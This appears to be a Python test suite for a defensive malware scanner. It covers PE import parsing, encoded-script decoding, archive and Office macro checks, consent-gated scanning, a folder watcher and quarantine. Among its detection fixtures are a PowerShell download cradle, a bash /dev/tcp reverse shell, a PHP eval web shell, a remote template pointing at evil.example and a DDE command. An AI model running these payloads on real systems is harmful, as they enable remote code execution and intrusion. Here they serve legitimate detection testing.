import base64, hashlib, io, json, os, struct, tempfile, threading, time, unittest, urllib.error, urllib.request, zipfile
from pathlib import Path
from unittest import mock
from ultrimater.api.server import create_server
from ultrimater.shield import containers, scopes, startup
from ultrimater.shield.hashlists import parse as parse_hashes
from ultrimater.shield.quarantine import ConfirmationRequired, ConsentRequired
from ultrimater.shield.rules import load_user_rules
from ultrimater.shield.scanner import (CHUNK, EICAR, ULTRIMATER_MARKER, Scanner, decode_encoded_commands, inspect_content)
from ultrimater.shield.watcher import FolderWatcher
from ultrimater.core import picker
from tests.helpers import SALT, new_app


def build_pe(imports, flags=0x60000020, section=b".text", size=0x1000):
    """A minimal but structurally valid PE32 with an import table (never executed; parsed only)."""
    va, raw = 0x1000, 0x400
    blob, desc, names, thunks = bytearray(), bytearray(), bytearray(), bytearray()
    dll_list = list(imports.items())
    desc_len = 20 * (len(dll_list) + 1)
    # lay out: descriptors | dll names | per-dll thunk arrays | hint/name entries
    cur = desc_len
    name_rvas = {}
    for dll, _ in dll_list:
        name_rvas[dll] = va + cur; cur += len(dll) + 1
    thunk_rvas, hint_blobs = {}, {}
    hint_start = cur + sum(4 * (len(f) + 1) for _, f in dll_list)
    hcur = hint_start
    for dll, funcs in dll_list:
        thunk_rvas[dll] = va + cur; cur += 4 * (len(funcs) + 1)
    arrays = {}
    for dll, funcs in dll_list:
        arr = bytearray()
        for f in funcs:
            arr += struct.pack("<I", va + hcur); hint_blobs[hcur] = b"\0\0" + f.encode() + b"\0"; hcur += len(hint_blobs[hcur])
        arr += struct.pack("<I", 0); arrays[dll] = bytes(arr)
    for dll, _ in dll_list:
        desc += struct.pack("<IIIII", thunk_rvas[dll], 0, 0, name_rvas[dll], thunk_rvas[dll])
    desc += b"\0" * 20
    names = b"".join(d.encode() + b"\0" for d, _ in dll_list)
    sect = bytearray(desc) + names + b"".join(arrays[d] for d, _ in dll_list)
    sect += b"\0" * (hint_start - len(sect))
    for off in sorted(hint_blobs):
        sect += hint_blobs[off]
    sect = bytes(sect).ljust(size, b"\0")
    dos = bytearray(b"MZ" + b"\0" * 62); dos[0x3C:0x40] = struct.pack("<I", 0x40)
    fh = struct.pack("<HHIIIHH", 0x14c, 1, 0, 0, 0, 224, 0x102)
    opt = bytearray(224); struct.pack_into("<H", opt, 0, 0x10b); struct.pack_into("<I", opt, 16, va); struct.pack_into("<I", opt, 92, 16)
    struct.pack_into("<II", opt, 96 + 8, va, desc_len)
    sh = section.ljust(8, b"\0") + struct.pack("<IIIIIIHHI", size, va, size, raw, 0, 0, 0, 0, flags)
    head = bytes(dos) + b"PE\0\0" + fh + bytes(opt) + sh
    return head.ljust(raw, b"\0") + sect


def findings(name, data): return inspect_content(name, data, None, SALT, hashlib.sha256(data).hexdigest())
def titles(name, data): return [f.title for f in findings(name, data)]


class PEImportTests(unittest.TestCase):
    def test_import_table_is_parsed(self):
        from ultrimater.shield import pe
        info = pe.parse(build_pe({"kernel32.dll": ["CreateFileW", "ReadFile"], "user32.dll": ["MessageBoxW"]}))
        self.assertEqual(info.imports, {"kernel32.dll": ["CreateFileW", "ReadFile"], "user32.dll": ["MessageBoxW"]})

    def test_benign_program_is_not_flagged(self):
        self.assertEqual(titles("app.exe", build_pe({"kernel32.dll": ["CreateFileW", "ReadFile", "WriteFile"], "user32.dll": ["MessageBoxW"]})), [])

    def test_injection_api_combo_flagged_with_evidence(self):
        fs = findings("loader.exe", build_pe({"kernel32.dll": ["VirtualAllocEx", "WriteProcessMemory", "CreateRemoteThread", "OpenProcess"]}))
        self.assertEqual(len(fs), 1); self.assertEqual(fs[0].severity.value, "low")
        self.assertTrue(any("process injection" in e.description for e in fs[0].evidence))
        self.assertIn("NOT executed", fs[0].explanation)

    def test_more_signals_raise_severity_but_confidence_stays_modest(self):
        fs = findings("x.exe", build_pe({"kernel32.dll": ["VirtualAllocEx", "WriteProcessMemory", "CreateRemoteThread"], "user32.dll": ["SetWindowsHookExW", "GetAsyncKeyState"]}, flags=0xE0000020))
        self.assertEqual(fs[0].severity.value, "medium"); self.assertNotEqual(fs[0].confidence.value, "high")

    def test_valid_signature_lowers_severity(self):
        pe_ = build_pe({"kernel32.dll": ["VirtualAllocEx", "WriteProcessMemory", "CreateRemoteThread"]})
        f = inspect_content("x.exe", pe_, "x.exe", SALT, "0", authenticode="Valid")[0]
        self.assertEqual(f.severity.value, "info")


class ScriptDecodeTests(unittest.TestCase):
    def test_hidden_encoded_command_is_decoded_and_inspected(self):
        cmd = "IEX (New-Object Net.WebClient).DownloadString('http://example.test/a.ps1')"
        b64 = base64.b64encode(cmd.encode("utf-16le")).decode()
        script = f"powershell.exe -NoProfile -enc {b64}".encode()
        self.assertEqual(len(decode_encoded_commands(script)), 1)
        fs = findings("run.ps1", script)
        self.assertEqual(len(fs), 1); self.assertTrue(any("decoded" in e.description for e in fs[0].evidence))

    def test_plain_admin_script_not_flagged(self):
        self.assertEqual(titles("backup.ps1", b"Copy-Item C:\\data D:\\backup -Recurse\nWrite-Host done"), [])


class RuleTests(unittest.TestCase):
    def test_detections(self):
        self.assertIn("Ransom-note language", titles("README.txt", b"Your files have been encrypted. To decrypt your files send bitcoin payment within 48 hours or the price doubles."))
        self.assertIn("Web-shell code pattern", titles("up.php", b"<?php eval(base64_decode($_POST['x'])); ?>"))
        self.assertIn("Reverse-shell command", titles("a.sh", b"bash -i >& /dev/tcp/10.1.1.1/9001 0>&1"))
        lnk = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -w hidden -enc AAAA".encode("utf-16le")
        self.assertIn("Shortcut launches a script engine with risky arguments", titles("invoice.lnk", lnk))

    def test_false_positive_traps(self):
        self.assertEqual(titles("blog.txt", b"Ransomware encrypts your files and attackers demand bitcoin. Here is how to back up."), [])
        self.assertEqual(titles("page.php", b"<?php echo htmlspecialchars($_POST['name']); ?>"), [])
        self.assertEqual(titles("notepad.lnk", "C:\\Windows\\System32\\notepad.exe C:\\notes.txt".encode("utf-16le")), [])
        self.assertEqual(titles("readme.txt", b"bitcoin is a currency; files and encryption are topics we studied"), [])

    def test_user_rules_are_literal_only_and_bad_files_do_not_stop_scans(self):
        d = Path(tempfile.mkdtemp())
        (d / "ok.json").write_text(json.dumps({"id": "proj", "name": "Internal marker", "severity": "medium", "strings": ["(a+)+$ secret-project"], "extensions": [".txt"]}))
        (d / "bad.json").write_text("{not json"); (d / "bad2.json").write_text(json.dumps({"id": "x", "name": "y", "strings": []}))
        rules, problems = load_user_rules(d)
        self.assertEqual(len(rules), 1); self.assertEqual(len(problems), 2)
        self.assertEqual(len(inspect_content("a.txt", b"x (a+)+$ secret-project y", None, SALT, "0", rules=rules)), 1)   # matched as LITERAL text
        self.assertEqual(inspect_content("a.txt", b"aaaaaaaaaaaaaaaaaaaaaaaa!", None, SALT, "0", rules=rules), [])     # not treated as a regex


class ContainerTests(unittest.TestCase):
    def zip_bytes(self, files):
        b = io.BytesIO()
        with zipfile.ZipFile(b, "w", zipfile.ZIP_DEFLATED) as z:
            for n, d in files.items(): z.writestr(n, d)
        return b.getvalue()

    def inspect(self, data, name="a.zip"):
        return containers.inspect_zip(io.BytesIO(data), name, None, SALT, lambda n, d, p, s, sha, depth=0: inspect_content(n, d, p, s, sha, depth=depth))

    def test_program_disguised_as_document_inside_zip(self):
        fs = self.inspect(self.zip_bytes({"invoice.pdf": b"MZ" + b"\x90" * 200, "readme.txt": b"hello"}))
        self.assertEqual([f.title for f in fs], ["Program hidden inside archive as a document"]); self.assertEqual(fs[0].tier.value, "verified")

    def test_signature_inside_nested_archive(self):
        inner = self.zip_bytes({"payload.txt": ULTRIMATER_MARKER})
        fs = self.inspect(self.zip_bytes({"inner.zip": inner}))
        self.assertTrue(any("inside archive" in f.title for f in fs))

    def test_clean_zip_and_fake_exe_name_are_not_flagged(self):
        self.assertEqual(self.inspect(self.zip_bytes({"a.txt": b"hi", "setup.exe": b"this is plain text"})), [])

    def test_decompression_bomb_guard(self):
        fs = self.inspect(self.zip_bytes({f"f{i}.txt": b"x" for i in range(3100)}))
        self.assertEqual(fs[0].category, "shield.archive_bomb")

    def ooxml(self, extra):
        return self.zip_bytes({"[Content_Types].xml": "<Types/>", "word/document.xml": "<w:document/>", **extra})

    def test_macros_in_office_documents(self):
        low = self.inspect(self.ooxml({"word/vbaProject.bin": b"\xd0\xcf\x11\xe0 some vba"}), "memo.docm")
        self.assertEqual((low[0].category, low[0].severity.value), ("shield.macro", "low"))
        hi = self.inspect(self.ooxml({"word/vbaProject.bin": b"Sub AutoOpen() CreateObject(\"WScript.Shell\") powershell"}), "memo.docm")
        self.assertEqual(hi[0].severity.value, "medium")
        self.assertEqual(self.inspect(self.ooxml({}), "plain.docx"), [])

    def test_remote_template_and_dde(self):
        rels = '<Relationships><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="http://evil.example/t.dotm" TargetMode="External"/></Relationships>'
        self.assertEqual(self.inspect(self.ooxml({"word/_rels/settings.xml.rels": rels}), "a.docx")[0].category, "shield.remote_template")
        self.assertEqual(self.inspect(self.ooxml({"word/document.xml": '<w:instrText>DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe</w:instrText>'}), "a.docx")[0].category, "shield.dde")

    def test_legacy_ole_macro_presence(self):
        data = b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\0" * 100 + "_VBA_PROJECT".encode("utf-16le") + b"\0" * 50
        self.assertEqual(containers.inspect_ole(data, "old.doc", None, SALT)[0].category, "shield.macro")
        self.assertEqual(containers.inspect_ole(b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\0" * 200, "plain.doc", None, SALT), [])


class SmartVsDeepTests(unittest.TestCase):
    def test_smart_quick_inspects_big_media_but_reads_risky_types_fully(self):
        d = Path(tempfile.mkdtemp()); blob = b"A" * (400 * 1024)
        (d / "movie.mp4").write_bytes(blob + ULTRIMATER_MARKER)          # marker deep inside a big non-risky file
        (d / "big_script.ps1").write_bytes(blob + ULTRIMATER_MARKER)
        smart, fs_s = Scanner(SALT, mode="smart").scan(str(d)); deep, fs_d = Scanner(SALT, mode="deep").scan(str(d))
        self.assertEqual((smart.files_quick, smart.files_full), (1, 1)); self.assertEqual(len(fs_s), 1)
        self.assertEqual(len(fs_d), 2); self.assertEqual(deep.files_quick, 0)

    def test_threaded_scan_is_complete_and_correct(self):
        d = Path(tempfile.mkdtemp())
        for i in range(400): (d / f"f{i}.txt").write_text(f"file {i}")
        for i in range(5): (d / f"bad{i}.txt").write_bytes(ULTRIMATER_MARKER)
        res, fs = Scanner(SALT, workers=4).scan(str(d))
        self.assertEqual((res.files_scanned, len(fs), res.verdict, res.enumerating), (405, 5, "test", False))   # harmless test files are not a danger

    def test_skip_patterns_and_coverage_reporting(self):
        d = Path(tempfile.mkdtemp()); (d / "skipme").mkdir(); (d / "skipme" / "x.txt").write_bytes(ULTRIMATER_MARKER); (d / "ok.txt").write_text("fine")
        res, fs = Scanner(SALT).scan(str(d), skip=[("/skipme/", "test reason")])
        self.assertEqual((res.files_scanned, len(fs)), (1, 0)); self.assertEqual(res.skipped_dirs[0]["reason"], "test reason"); self.assertEqual(res.verdict, "clean")

    @unittest.skipIf(hasattr(os, "geteuid") and os.geteuid() == 0, "root ignores permissions")
    def test_unreadable_folders_are_reported_not_hidden(self):
        d = Path(tempfile.mkdtemp()); locked = d / "locked"; locked.mkdir(); (locked / "a.txt").write_text("x"); (d / "b.txt").write_text("y"); os.chmod(locked, 0)
        try: res, _ = Scanner(SALT).scan(str(d))
        finally: os.chmod(locked, 0o700)
        self.assertEqual(res.access_denied, 1); self.assertTrue(any("access denied" in e["error"] for e in res.errors))

    def test_cancel_stops_scan(self):
        d = Path(tempfile.mkdtemp())
        for i in range(2000): (d / f"f{i}.txt").write_text("x" * 100)
        sc = Scanner(SALT, workers=2); t = threading.Timer(0.05, sc.cancel_event.set); t.start()
        res, _ = sc.scan(str(d)); self.assertIn(res.status, ("cancelled", "completed"))


class ConsentTests(unittest.TestCase):
    def setUp(self):
        self.app = new_app(); self.d = Path(tempfile.mkdtemp()); (self.d / "m.txt").write_bytes(ULTRIMATER_MARKER)
        self.plan = scopes.ScopePlan("quick", "Quick scan", [self.d], [], True, "x", "y")

    def wait(self, sid):
        for _ in range(200):
            s = self.app.scan_status(sid)
            if s and s["status"] != "running": return s
            time.sleep(0.05)

    def test_scope_scan_refused_without_consent_and_nothing_is_read(self):
        with mock.patch.object(scopes, "build_plan", return_value=self.plan):
            with self.assertRaises(ConsentRequired) as c: self.app.start_scan(scope="quick")
        self.assertEqual(c.exception.details["roots"], [str(self.d)]); self.assertTrue(any("never" in p.lower() or "only" in p.lower() for p in c.exception.details["promises"]))
        self.assertEqual(self.app.scan_history(), []); self.assertFalse(any(e["event"] == "scan.started" for e in self.app.audit.entries()))

    def test_consent_is_logged_and_scan_runs(self):
        with mock.patch.object(scopes, "build_plan", return_value=self.plan):
            sid = self.app.start_scan(scope="quick", consent=True)["scan_id"]
        s = self.wait(sid); self.assertEqual((s["status"], s["verdict"], s["scope"]), ("completed", "test", "quick"))
        self.assertTrue(any(e["event"] == "scan.consent_granted" for e in self.app.audit.entries())); self.assertTrue(self.app.audit.verify()["ok"])

    def test_broad_targets_need_consent_but_picked_folders_do_not(self):
        with self.assertRaises(ConsentRequired): self.app.start_scan("/")
        with self.assertRaises(ConsentRequired): self.app.start_scan(str(Path.home()))
        self.assertEqual(self.wait(self.app.start_scan(str(self.d))["scan_id"])["status"], "completed")      # you chose it -> fine

    def test_unknown_scope_and_bad_mode_rejected(self):
        with self.assertRaises(ValueError): self.app.start_scan(scope="everything", consent=True)
        with self.assertRaises(ValueError): self.app.start_scan(str(self.d), mode="turbo")

    def test_http_consent_flow(self):
        srv, tok = create_server(self.app, 0); threading.Thread(target=srv.serve_forever, daemon=True).start()
        def call(body):
            r = urllib.request.Request(f"http://127.0.0.1:{srv.server_address[1]}/api/scan", method="POST", headers={"X-Session-Token": tok}, data=json.dumps(body).encode())
            try:
                with urllib.request.urlopen(r) as x: return x.status, json.loads(x.read())
            except urllib.error.HTTPError as e: return e.code, json.loads(e.read())
        try:
            with mock.patch.object(scopes, "build_plan", return_value=self.plan):
                s, b = call({"scope": "quick"}); self.assertEqual((s, b["error"]), (409, "confirmation_required")); self.assertIn("roots", b["details"])
                s, b = call({"scope": "quick", "consent": True}); self.assertEqual(s, 200)
            self.assertEqual(call({"scope": "everywhere"})[0], 400)
        finally: srv.shutdown()


class PickerTests(unittest.TestCase):
    def test_pick_returns_chosen_paths_and_handles_cancel(self):
        app = new_app(); app.picker = lambda kind, title, flt: ["C:\\Users\\me\\Downloads"] if kind == "folder" else []
        self.assertEqual(app.pick("folder")["paths"], ["C:\\Users\\me\\Downloads"]); self.assertTrue(app.pick("file")["cancelled"])

    def test_unavailable_dialog_falls_back_gracefully(self):
        app = new_app()
        def boom(*a): raise picker.PickerUnavailable("no display")
        app.picker = boom; r = app.pick("folder"); self.assertTrue(r["unavailable"]); self.assertIn("type the path", r["message"])

    def test_invalid_kind_rejected(self):
        with self.assertRaises(ValueError): picker.pick("directory-of-doom")


class HashListTests(unittest.TestCase):
    def test_parse_and_import_and_detect(self):
        content = b"my special sample"; sha = hashlib.sha256(content).hexdigest()
        self.assertEqual(parse_hashes(f"# list\n{sha},TestMalware\nnot a hash\n")[0], (sha, "TestMalware"))
        app = new_app(); d = Path(tempfile.mkdtemp()); (d / "list.txt").write_text(f"{sha.upper()} ,BadThing\n"); (d / "sample.bin").write_bytes(content)
        self.assertEqual(app.import_hashlist(str(d / "list.txt"))["imported"], 1)
        res, fs = app._make_scanner().scan(str(d / "sample.bin"))
        self.assertEqual((fs[0].category, fs[0].confidence.value), ("shield.hash", "high")); self.assertIn("BadThing", fs[0].title)
        app.clear_hashlist(); self.assertEqual(app.hashlists.summary()["total"], 0)
        with self.assertRaises(ValueError): app.import_hashlist(str(d / "sample.bin"))


class StartupTests(unittest.TestCase):
    def test_startup_items(self):
        e = [{"source": "Run", "name": "Upd", "command": '"C:\\Users\\me\\AppData\\Local\\Temp\\x7f.exe" -s'},
             {"source": "Run", "name": "Help", "command": "powershell.exe -w hidden -enc AAAA http://e.example/a"},
             {"source": "Run", "name": "OneDrive", "command": '"C:\\Program Files\\Microsoft OneDrive\\OneDrive.exe" /background'}]
        fs = startup.assess(e, SALT, exists=lambda p: True); self.assertEqual(sorted(f.title.split(": ")[1] for f in fs), ["Help", "Upd"])

    def test_hosts_file(self):
        fs = startup.check_hosts("127.0.0.1 localhost\n0.0.0.0 update.microsoft.com\n6.6.6.6 www.paypal.com\n127.0.0.1 dev.local # mine\n", SALT)
        self.assertEqual(len(fs), 2); self.assertEqual(startup.check_hosts("127.0.0.1 localhost\n::1 localhost\n", SALT), [])

    def test_unavailable_off_windows_is_honest(self):
        if os.name == "nt": self.skipTest("windows")
        self.assertFalse(startup.collect()["available"]); r = new_app().system_check(); self.assertFalse(r["available"]); self.assertEqual(r["flagged"], 0)


class WatcherTests(unittest.TestCase):
    def test_only_new_stable_files_are_scanned(self):
        d = Path(tempfile.mkdtemp()); (d / "old.txt").write_bytes(ULTRIMATER_MARKER)       # pre-existing: NOT scanned by the watcher
        seen, found = [], []
        sc = Scanner(SALT)
        w = FolderWatcher(lambda p: (seen.append(p.name), sc.scan_file(p)[0])[1], lambda p, f: found.append(p.name), poll=0.1); w.start([d])
        try:
            time.sleep(0.3)
            (d / "new.txt").write_bytes(ULTRIMATER_MARKER); (d / "clean.txt").write_text("hello"); (d / "movie.crdownload").write_bytes(ULTRIMATER_MARKER)
            for _ in range(40):
                if "new.txt" in found and "clean.txt" in seen: break
                time.sleep(0.1)
        finally: w.stop()
        self.assertIn("new.txt", found); self.assertIn("clean.txt", seen); self.assertNotIn("clean.txt", found)
        self.assertNotIn("old.txt", seen); self.assertNotIn("movie.crdownload", seen)

    def test_growing_file_waits_until_complete(self):
        d = Path(tempfile.mkdtemp()); seen = []
        w = FolderWatcher(lambda p: (seen.append(p.stat().st_size), [])[1], lambda p, f: None, poll=0.15); w.start([d])
        try:
            f = d / "dl.bin"
            with open(f, "wb") as fh:
                for _ in range(4): fh.write(b"x" * 100); fh.flush(); time.sleep(0.1)
            time.sleep(0.8)
        finally: w.stop()
        self.assertEqual(seen, [400])                          # scanned once, at its final size

    def test_app_level_consent_and_persistence(self):
        app = new_app(); d = Path(tempfile.mkdtemp())
        with self.assertRaises(ConsentRequired) as c: app.set_watcher(True, [str(d)])
        self.assertIn(str(d), c.exception.details["roots"]); self.assertFalse(app.watcher.running)
        app.watcher.poll = 0.1; st = app.set_watcher(True, [str(d)], consent=True); self.assertTrue(st["running"])
        self.assertTrue(any(e["event"] == "watcher.enabled" for e in app.audit.entries()))
        (d / "evil.txt").write_bytes(ULTRIMATER_MARKER)
        for _ in range(40):
            if app.db.list_findings(module="shield"): break
            time.sleep(0.1)
        self.assertEqual(app.db.list_findings(module="shield")[0].category, "shield.signature")
        app.watcher.stop(); from ultrimater.app import UltrimaterApp
        again = UltrimaterApp(app.paths.home); self.assertTrue(again.watcher.running); again.watcher.stop()   # restarts only because consent was recorded
        again.set_watcher(False); self.assertFalse(again.watcher_status()["enabled"])

    def test_watcher_enable_cannot_be_smuggled_through_generic_settings(self):
        with self.assertRaises(ValueError): new_app().update_settings({"watch_enabled": True})


class BulkQuarantineTests(unittest.TestCase):
    def test_bulk_requires_confirmation_then_moves_all_and_is_reversible(self):
        app = new_app(); d = Path(tempfile.mkdtemp())
        for i in range(3): (d / f"m{i}.txt").write_bytes(ULTRIMATER_MARKER)
        res, fs = app._make_scanner().scan(str(d))
        for f in fs: app.db.save_finding(f)
        ids = [f.id for f in fs]
        with self.assertRaises(ConfirmationRequired): app.quarantine_findings(ids, confirm=False)
        self.assertEqual(len(list(d.glob("*.txt"))), 3)
        out = app.quarantine_findings(ids, confirm=True); self.assertEqual((len(out["quarantined"]), out["failed"]), (3, []))
        self.assertEqual(list(d.glob("*.txt")), [])
        for q in app.vault.list(): app.response.restore_quarantined(q["id"], confirm=True)
        self.assertEqual(len(list(d.glob("*.txt"))), 3)
